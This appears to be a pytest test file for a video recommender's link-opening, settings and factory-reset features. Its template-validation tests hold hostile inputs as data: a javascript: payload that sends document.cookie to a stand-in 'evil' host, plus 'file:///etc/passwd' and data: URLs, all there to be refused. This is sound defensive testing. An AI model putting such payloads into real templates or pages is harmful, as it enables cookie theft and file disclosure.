"""Opening videos, and resetting.

Covers the 404 fix (links go through /open to a provider you chose, and demo
videos never reach a provider), the click-recording fix (an open is not a 2%
watch), and the factory reset (typed confirmation, backups, and what each scope
keeps).
"""

from __future__ import annotations

import sqlite3
import time
from urllib.parse import parse_qs, urlparse

import pytest
from fastapi.testclient import TestClient

from sieve import actions, interests, profiles, providers, ranking, scoring
from sieve.app import create_app
from sieve.cli import seed_demo
from sieve.config import Config, resolve_settings
from sieve.db import Database
from tests.support import offline_config

REAL = "dQw4w9WgXcQ"
CLOSED = "http://127.0.0.1:9"


def cfg_for(tmp_path, **extra):
    return offline_config(tmp_path, **extra)


def settings(**playback):
    return resolve_settings({"playback": playback} if playback else {})


def real_video(vid=REAL, **overrides):
    base = {
        "id": vid, "title": "Writing a page allocator", "author": "Kernel", "author_id": "UCk",
        "published": int(time.time()) - 3600, "duration": 1200, "views": 9000, "likes": 400,
        "description": "", "keywords": ["kernel"], "genre": "Science & Technology",
        "is_live": 0, "is_upcoming": 0, "family_safe": 1, "sub_count": 50000,
    }
    base.update(overrides)
    return base


@pytest.fixture()
def client(tmp_path):
    app = create_app(cfg_for(tmp_path), start_worker=False)
    db = app.state.db
    db.upsert_videos([real_video()])
    db.executemany(scoring.INSERT_SCORE, [scoring.card_to_row(scoring.score_video(real_video()))])
    return TestClient(app, follow_redirects=False)


# -- building links ----------------------------------------------------------


@pytest.mark.parametrize("provider,expected", [
    ("invidious", "http://127.0.0.1:3000/watch?v=dQw4w9WgXcQ"),
    ("piped", "https://piped.video/watch?v=dQw4w9WgXcQ"),
    ("youtube", "https://www.youtube.com/watch?v=dQw4w9WgXcQ"),
    ("nocookie", "/play/dQw4w9WgXcQ"),
    ("freetube", "freetube://https://www.youtube.com/watch?v=dQw4w9WgXcQ"),
])
def test_each_provider_builds_the_right_link(provider, expected):
    assert providers.url_for(provider, REAL, settings(), Config()) == expected


@pytest.mark.parametrize("provider,fragment", [
    ("invidious", "&t=95"), ("piped", "&t=95"), ("youtube", "&t=95s"),
    ("nocookie", "/play/dQw4w9WgXcQ?t=95"), ("freetube", "&t=95"),
])
def test_start_times_use_each_providers_own_syntax(provider, fragment):
    assert providers.url_for(provider, REAL, settings(), Config(), start=95).endswith(fragment)


def test_custom_template_fills_id_and_time():
    s = settings(custom_url="mpv://play?v={id}&start={t}")
    assert providers.url_for("custom", REAL, s, Config(), start=12) == f"mpv://play?v={REAL}&start=12"


def test_configured_instances_are_used():
    s = settings(invidious_url="https://yewtu.be", piped_url="https://piped.example")
    assert providers.url_for("invidious", REAL, s, Config()).startswith("https://yewtu.be/watch")
    assert providers.url_for("piped", REAL, s, Config()).startswith("https://piped.example/watch")


def test_invidious_falls_back_to_watch_base():
    cfg = Config(watch_base="https://video.example.com/watch?v=")
    assert providers.url_for("invidious", REAL, settings(), cfg) == \
        f"https://video.example.com/watch?v={REAL}"


@pytest.mark.parametrize("pasted,clean", [
    ("yewtu.be", "https://yewtu.be"),
    ("https://yewtu.be/", "https://yewtu.be"),
    ("https://yewtu.be/watch", "https://yewtu.be"),
    ("http://192.168.1.4:3000", "http://192.168.1.4:3000"),
])
def test_pasted_instance_addresses_are_tidied(pasted, clean):
    assert providers.clean_base(pasted) == clean


@pytest.mark.parametrize("template", [
    "javascript:alert(1)//{id}",
    "data:text/html,{id}",
    "file:///etc/passwd?{id}",
    "https://example.com/watch",              # no {id}
    "https://example.com/{id}?user={user}",   # unknown placeholder
])
def test_dangerous_or_broken_templates_are_refused(template):
    with pytest.raises(providers.ProviderError):
        providers.clean_template(template)


def test_a_shared_profile_cannot_smuggle_in_a_javascript_template():
    clean = profiles.sanitise_settings({"playback": {
        "provider": "custom", "custom_url": "javascript:fetch('//evil/'+document.cookie)//{id}"}})
    assert "custom_url" not in clean.get("playback", {})


@pytest.mark.parametrize("vid,ok", [
    (REAL, True), ("jNQXAC9IVRw", True), ("demo0003", False), ("", False),
    ("dQw4w9WgXcQx", False), ("dQw4w9WgXc!", False),
])
def test_only_real_video_ids_are_playable(vid, ok):
    assert providers.playable(vid) is ok


@pytest.mark.parametrize("progress,duration,expected", [
    (0.5, 1200, 595), (0.02, 1200, None), (0.97, 1200, None), (0.5, 0, None), (0.06, 60, 0),
])
def test_resume_point(progress, duration, expected):
    assert providers.resume_at(progress, duration) == expected


# -- /open ---------------------------------------------------------------------


def test_open_redirects_to_the_default_provider(client):
    """Nothing chosen and the config's Invidious is the local guess: Sieve's
    own player, rather than a connection error on every video."""
    response = client.get(f"/open/{REAL}")
    assert response.status_code == 302
    assert response.headers["location"] == f"/play/{REAL}"
    assert response.headers["referrer-policy"] == "no-referrer"


def test_a_chosen_invidious_is_used_even_when_local(client):
    client.post("/api/settings", json={"playback": {"provider": "invidious"}})
    assert client.get(f"/open/{REAL}").headers["location"] == f"http://127.0.0.1:3000/watch?v={REAL}"


def test_a_real_remote_watch_base_is_the_default(tmp_path):
    app = create_app(cfg_for(tmp_path, watch_base="https://video.example.com/watch?v="), start_worker=False)
    location = TestClient(app, follow_redirects=False).get(f"/open/{REAL}").headers["location"]
    assert location == f"https://video.example.com/watch?v={REAL}"


def test_open_honours_a_chosen_provider(client):
    client.post("/api/settings", json={"playback": {"provider": "piped", "piped_url": "https://p.example"}})
    assert client.get(f"/open/{REAL}").headers["location"] == f"https://p.example/watch?v={REAL}"
    assert client.get(f"/open/{REAL}?via=youtube").headers["location"].startswith("https://www.youtube.com/")


def test_demo_videos_never_reach_a_provider(client):
    """The 404: demo ids are invented, so every provider answers "not found".
    They now go to their Sieve page, which explains."""
    response = client.get("/open/demo0003")
    assert response.status_code == 303
    assert response.headers["location"] == "/video/demo0003?unplayable=1"


def test_an_unusable_provider_is_a_clear_400(client):
    response = client.get(f"/open/{REAL}?via=custom")   # no template set yet
    assert response.status_code == 400
    assert "Playback" in response.json()["detail"]


def test_open_records_an_open_not_a_watch(client):
    """Regression: a click used to be stored as a 2% watch, which every part of
    the learner reads as a bounce."""
    db = client.app.state.db
    client.get(f"/open/{REAL}?via=youtube")
    assert db.opened_ids() == {REAL}
    assert db.one("SELECT COUNT(*) AS n FROM history")["n"] == 0
    assert db.one("SELECT provider FROM opens")["provider"] == "youtube"


def test_open_resumes_from_real_progress(client):
    db = client.app.state.db
    db.record_watch(REAL, 0.5, origin="player")
    location = client.get(f"/open/{REAL}").headers["location"]
    assert parse_qs(urlparse(location).query)["t"] == ["595"]


def test_resume_can_be_turned_off(client):
    db = client.app.state.db
    db.record_watch(REAL, 0.5, origin="player")
    client.post("/api/settings", json={"playback": {"resume": False}})
    assert "t=" not in client.get(f"/open/{REAL}").headers["location"]


def test_an_opened_video_leaves_the_homepage_with_its_own_reason(tmp_path):
    db = Database(str(tmp_path / "t.db"))
    db.upsert_videos([real_video()])
    db.executemany(scoring.INSERT_SCORE, [scoring.card_to_row(scoring.score_video(real_video()))])
    db.record_open(REAL, "youtube")
    result = ranking.recommend(db, resolve_settings({"filters": {"hide_shorts": False}}))
    assert REAL not in {i.id for i in result.items}
    assert any(r["reason"] == "you already opened this" for r in result.diagnostics["rejected"])


def test_opening_videos_teaches_no_dislike(tmp_path):
    """Opening a video must not turn its topics into negative interests."""
    db = Database(str(tmp_path / "t.db"))
    db.upsert_videos([real_video()])
    db.executemany(scoring.INSERT_SCORE, [scoring.card_to_row(scoring.score_video(real_video()))])
    for _ in range(5):
        db.record_open(REAL, "youtube")
    interests.derive_from_history(db)
    negative = [r for r in interests.listing(db) if r["weight"] < 0]
    assert negative == []


def test_links_endpoint_matches_open(client):
    body = client.get(f"/api/videos/{REAL}/links").json()
    assert body["playable"] and body["links"][0]["default"]
    assert client.get(f"/open/{REAL}").headers["location"] == body["links"][0]["url"]
    demo = client.get("/api/videos/demo0003/links").json()
    assert demo == {**demo, "playable": False, "links": [], "default": None}


def test_bad_playback_settings_from_the_api_are_rejected(client):
    response = client.post("/api/settings", json={"playback": {"custom_url": "javascript:x//{id}"}})
    assert response.status_code == 400
    assert "must start with" in response.json()["detail"]


def test_choosing_custom_without_a_template_is_refused(client):
    """Autosave sends one control at a time; picking Custom before typing a
    template must say so, not silently fall back to Invidious."""
    response = client.post("/api/settings", json={"playback": {"provider": "custom"}})
    assert response.status_code == 400 and "template" in response.json()["detail"]
    client.post("/api/settings", json={"playback": {"custom_url": "mpv://play?v={id}"}})
    assert client.post("/api/settings", json={"playback": {"provider": "custom"}}).status_code == 200


def test_one_control_at_a_time_leaves_the_rest_alone(client):
    """What autosave relies on: a patch changes exactly what it names."""
    client.post("/api/settings", json={"homepage": {"count": 18}})
    client.post("/api/settings", json={"targets": {"education": {"enabled": True, "weight": 2.0}}})
    client.post("/api/settings", json={"targets": {"education": {"target": 85}}})
    settings = actions.resolved_settings(client.app.state.db)
    assert settings["homepage"]["count"] == 18
    assert settings["targets"]["education"] == {"enabled": True, "target": 85, "weight": 2.0}


def test_the_response_reports_what_was_applied(client):
    """Autosave compares this with what it sent, so a refused value is
    reported rather than shown as saved."""
    body = client.post("/api/settings", json={"novelty": 60, "filters": {"nonsense": 1}}).json()
    assert body["applied"] == {"novelty": 60}

def test_unconfirmed_local_default_is_flagged_until_a_provider_is_chosen(client):
    assert "Choose where videos open" in client.get("/").text
    client.post("/api/settings", json={"playback": {"provider": "invidious"}})
    assert "Choose where videos open" not in client.get("/").text


def test_a_real_remote_watch_base_is_not_flagged(tmp_path):
    app = create_app(cfg_for(tmp_path, watch_base="https://video.example.com/watch?v="), start_worker=False)
    assert "Choose where videos open" not in TestClient(app).get("/").text


# -- migrating old click rows ---------------------------------------------------


def test_old_click_rows_move_from_history_to_opens(tmp_path):
    path = str(tmp_path / "old.db")
    db = Database(path)
    db.execute("INSERT INTO history(video_id, watched_at, progress, dwell, origin) "
               "VALUES('aaaaaaaaaaa', 1, 0.02, 0, 'player'), "
               "('bbbbbbbbbbb', 2, 0.65, 0, 'player'), "      # a real report: stays
               "('ccccccccccc', 3, 0.02, 40, 'player')")      # has dwell: a real report
    db.execute("DELETE FROM settings WHERE key = 'migration:click-rows-to-opens'")
    db.close()

    db = Database(path)
    history = {r["video_id"] for r in db.query("SELECT video_id FROM history")}
    assert history == {"bbbbbbbbbbb", "ccccccccccc"}
    assert db.opened_ids() == {"aaaaaaaaaaa"}
    assert Database(path).migrate() == [], "the migration runs once"


# -- reset ------------------------------------------------------------------------


@pytest.fixture()
def populated(tmp_path):
    db = Database(str(tmp_path / "sieve.db"))
    seed_demo(db, 60)
    db.record_open("demo0001", "youtube")
    actions.save_settings(db, {"novelty": 77})
    return db


def test_reset_needs_the_word(populated):
    for attempt in ("", "yes", "RESET please", "delete"):
        with pytest.raises(actions.ActionError):
            actions.reset(populated, "everything", attempt)
    assert populated.stats()["videos"] == 60, "nothing may be deleted without confirmation"


def test_the_confirmation_is_forgiving_about_case(populated):
    assert actions.reset(populated, "catalogue", "  RESET ")["rows"] > 0


def test_catalogue_reset_keeps_what_is_yours(populated):
    before = populated.stats()
    result = actions.reset(populated, "catalogue", "reset")
    after = populated.stats()
    assert after["videos"] == 0 and after["scored"] == 0
    assert result["deleted"]["scores"] == before["scored"], "cascade deletions must be counted"
    for kept in ("history", "subscriptions", "interests"):
        assert after[kept] == before[kept], kept
    assert populated.opened_ids() == {"demo0001"}
    assert actions.resolved_settings(populated)["novelty"] == 77


def test_factory_reset_leaves_nothing(populated):
    actions.reset(populated, "everything", "reset")
    counts = {
        r["name"]: populated.one(f'SELECT COUNT(*) AS n FROM "{r["name"]}"')["n"]
        for r in populated.query(
            "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'")
    }
    assert not {t: n for t, n in counts.items() if n}, f"rows left behind: {counts}"
    assert actions.resolved_settings(populated)["novelty"] != 77


def test_the_backup_holds_what_was_deleted(populated):
    result = actions.reset(populated, "everything", "reset")
    restored = sqlite3.connect(result["backup"])
    assert restored.execute("SELECT COUNT(*) FROM videos").fetchone()[0] == 60


def test_backups_are_pruned_oldest_first_and_names_never_repeat(populated):
    first = actions.reset(populated, "catalogue", "reset")["backup"]
    names = {first}
    for _ in range(actions.BACKUPS_KEPT + 2):
        names.add(actions.reset(populated, "catalogue", "reset")["backup"])
    kept = [b["file"] for b in actions.list_backups(populated)]
    assert len(names) == actions.BACKUPS_KEPT + 3, "every backup gets a new name"
    assert len(kept) == actions.BACKUPS_KEPT
    assert first not in kept, "the oldest goes first"


def test_backup_can_be_skipped(populated):
    assert actions.reset(populated, "catalogue", "reset", backup=False)["backup"] is None


def test_reset_over_the_api(client):
    assert client.post("/api/reset", json={"scope": "everything", "confirm": "no"}).status_code == 400
    assert client.post("/api/reset", json={"scope": "nonsense", "confirm": "reset"}).status_code == 400
    response = client.post("/api/reset", json={"scope": "everything", "confirm": "reset"})
    assert response.status_code == 200 and response.json()["backup"]
    assert client.get("/api/backups").json()["backups"]
    assert client.get("/api/status").json()["stats"]["videos"] == 0


def test_the_app_keeps_working_after_a_factory_reset(client):
    client.post("/api/reset", json={"scope": "everything", "confirm": "reset"})
    for page in ("/", "/settings", "/channels", "/debugger", "/analytics", "/rules"):
        assert client.get(page).status_code == 200, page


def test_head_follows_the_same_redirect_without_recording_an_open(client):
    """Link checkers send HEAD. They should see a working link, and should not
    count as you opening the video."""
    response = client.head(f"/open/{REAL}")
    assert response.status_code == 302
    assert response.headers["location"] == client.get(f"/open/{REAL}").headers["location"]
    assert client.app.state.db.one("SELECT COUNT(*) AS n FROM opens")["n"] == 1, \
        "only the GET should have been recorded"
